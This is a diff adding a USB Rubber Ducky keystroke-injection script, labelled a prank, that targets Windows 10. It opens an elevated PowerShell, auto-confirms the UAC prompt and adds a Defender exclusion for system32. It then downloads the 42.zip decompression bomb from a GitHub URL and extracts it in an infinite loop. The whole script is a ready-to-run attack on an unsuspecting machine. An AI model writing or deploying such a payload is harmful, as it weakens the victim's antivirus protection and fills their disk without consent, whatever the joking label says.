@@ -1,0 +1,19 @@
+REM Title: Zip Bomb
+REM Author: FalsePhilosopher
+REM Target:  Win, tested on 10
+REM Props: Hak5, friends and memes
+REM Version: 1.0
+REM Category: Prank
+REM Launches zip bomb and openes another after that one is done.
+REM
+REM startup delay
+DELAY 300
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 2000
+STRING powershell -w h Add-MpPreference -ExclusionPath C:\Windows\system32 ;; curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Bombs/zip_bomb/42.zip -OutFile 42.zip ;; while (1) { Expand-Archive -Path 42.zip -Force; }
+ENTER
